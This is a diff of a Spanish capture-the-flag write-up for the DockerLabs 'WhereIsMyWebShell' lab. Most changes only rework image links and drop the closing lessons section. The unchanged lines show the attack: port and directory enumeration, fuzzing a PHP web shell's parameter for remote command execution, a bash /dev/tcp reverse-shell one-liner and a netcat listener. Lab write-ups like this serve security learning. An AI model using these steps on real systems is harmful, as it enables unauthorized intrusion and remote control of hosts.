@@ -38,7 +38,7 @@ nmap -p- -sS -sC -sV --min-rate 5000 -n -vvv -Pn 192.168.100.2
 - `-vvv`: Establece un nivel de verborrea máximo, proporcionando información detallada sobre lo que Nmap está haciendo en cada paso del escaneo.
 - `-Pn`: Desactiva el ping previo al escaneo, lo que significa que Nmap no hará un "ping" para verificar si el host está activo antes de realizar el escaneo de puertos. Esto es útil cuando el objetivo puede estar bloqueando pings o para escanear máquinas sin respuesta a los pings.
 
-![image](https://github.com/eliferrob/CTFs/blob/main/DockerLabs%20-%20WhereIsMyWebShell/assets/1.png)
+![image](https://github.com/eliferrob/CTFs/blob/main/assets/WhereIsMyWebShell%20(1).png)
 
 **Resultados del escaneo:**
 
@@ -58,7 +58,7 @@ gobuster dir -u http://192.168.100.2 -w /usr/share/wordlists/directory-list-2.3-
 - `-w`: Define el archivo de lista de palabras que contiene posibles nombres de directorios y archivos a buscar en el servidor. En este caso, se utilizaremos una lista estándar con nombres comunes.
 - `-x`: Define las extensiones de archivos que se probarán para cada entrada en la lista de palabras. 
 
-![image](https://github.com/eliferrob/CTFs/blob/main/DockerLabs%20-%20WhereIsMyWebShell/assets/2.png)
+![image](https://github.com/eliferrob/CTFs/blob/main/assets/WhereIsMyWebShell%20(2).png)
 
 **Resultados relevantes:**
 
@@ -69,7 +69,7 @@ gobuster dir -u http://192.168.100.2 -w /usr/share/wordlists/directory-list-2.3-
 
 Inspeccionamos el archivo `warning.html` y encontramos lo siguiente:
 
-![image](https://github.com/eliferrob/CTFs/blob/main/DockerLabs%20-%20WhereIsMyWebShell/assets/3.png)
+![image](https://github.com/eliferrob/CTFs/blob/main/assets/WhereIsMyWebShell%20(3).png)
 
 Al intentar acceder a `shell.php`, no obtenemos ninguna respuesta visible. Esto sugiere que el archivo está esperando un parámetro específico para ejecutar comandos, algo similar a:
 
@@ -90,15 +90,15 @@ wfuzz -c --hl=0 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-li
 - `-w`: Especifica el diccionario de palabras que se utilizará. Este diccionario contiene una lista de posibles nombres de parámetros o directorios.
 - `-u "http://172.17.0.2/shell.php?FUZZ=whoami"`: Define la URL objetivo. La palabra clave `FUZZ` será reemplazada por cada palabra del diccionario. El parámetro reemplazado (`FUZZ`) se utilizará para intentar ejecutar el comando `whoami`.
 
-![image](https://github.com/eliferrob/CTFs/blob/main/DockerLabs%20-%20WhereIsMyWebShell/assets/4.png)
+![image](https://github.com/eliferrob/CTFs/blob/main/assets/WhereIsMyWebShell%20(4).png)
 
 La ejecución del comando nos devuelve como resultado el parámetro "parameter". Esto sugiere que hemos encontrado el parámetro correcto. Procedemos a verificarlo directamente en la web, y confirmamos que efectivamente hemos conseguido un **RCE** (Ejecución Remota de Comandos).
 
-![image](https://github.com/eliferrob/CTFs/blob/main/DockerLabs%20-%20WhereIsMyWebShell/assets/5.png)
+![image](https://github.com/eliferrob/CTFs/blob/main/assets/WhereIsMyWebShell%20(5).png)
 
 Ahora crearemos redactaremos una línea de código para ejecutar una **Reverse Shell** y ganar así acceso a la máquina. Nos dirigimos al sitio web: https://tex2e.github.io/reverse-shell-generator/index.html
 
-![image](https://github.com/eliferrob/CTFs/blob/main/DockerLabs%20-%20WhereIsMyWebShell/assets/6.png)
+![image](https://github.com/eliferrob/CTFs/blob/main/assets/WhereIsMyWebShell%20(6).png)
 
 ```bash
 bash -i >& /dev/tcp/192.168.100.1/4444 0>&1
@@ -106,7 +106,7 @@ bash -i >& /dev/tcp/192.168.100.1/4444 0>&1
 
 Abrimos Burpsuite y utilizamos su "Encoder" para codificar el comando en `URL`, modificándolo ligeramente:
 
-![image](https://github.com/eliferrob/CTFs/blob/main/DockerLabs%20-%20WhereIsMyWebShell/assets/7.png)
+![image](https://github.com/eliferrob/CTFs/blob/main/assets/WhereIsMyWebShell%20(7).png)
 
 Ponemos la máquina en modo escucha con la siguiente orden:
 
@@ -114,13 +114,13 @@ Ponemos la máquina en modo escucha con la siguiente orden:
 nc -nlvp 4444
 ```
 
-![image](https://github.com/eliferrob/CTFs/blob/main/DockerLabs%20-%20WhereIsMyWebShell/assets/8.png)
+![image](https://github.com/eliferrob/CTFs/blob/main/assets/WhereIsMyWebShell%20(8).png)
 
 Colocamos el resultado en la URL justo detrás del parámetro y se nos abrirá una shell en la terminal.
 
-![image](https://github.com/eliferrob/CTFs/blob/main/DockerLabs%20-%20WhereIsMyWebShell/assets/9.png)
+![image](https://github.com/eliferrob/CTFs/blob/main/assets/WhereIsMyWebShell%20(9).png)
 
-![image](https://github.com/eliferrob/CTFs/blob/main/DockerLabs%20-%20WhereIsMyWebShell/assets/10.png)
+![image](https://github.com/eliferrob/CTFs/blob/main/assets/WhereIsMyWebShell%20(10).png)
 
 
 ### 4. Escalada de Privilegios
@@ -129,14 +129,4 @@ Una vez dentro, nos dirigimos al directorio "/tmp", ya que en el sitio web nos a
 
 ¡Hemos tomado el control de la máquina!
 
-![image](https://github.com/eliferrob/CTFs/blob/main/DockerLabs%20-%20WhereIsMyWebShell/assets/11.png)
-
-## Lecciones Aprendidas
-
-- La enumeración de directorios y análisis manual son esenciales en desafíos web. Elegir un buen diccionario es clave para extraer un parámetro, aunque el proceso puede alargarse cuanto más palabras contenga este.
-- Es importante validar y sanitizar los parámetros en PHP a fin de limitar el rango de opciones esperadas, evitando así la ejecución remota de comandos.
-
-## Recursos
-
-- [Documentación oficial de PHP](https://www.php.net/)
-- [Herramientas utilizadas: Nmap, Gobuster...](https://github.com/tools)
+![image](https://github.com/eliferrob/CTFs/blob/main/assets/WhereIsMyWebShell%20(11).png)
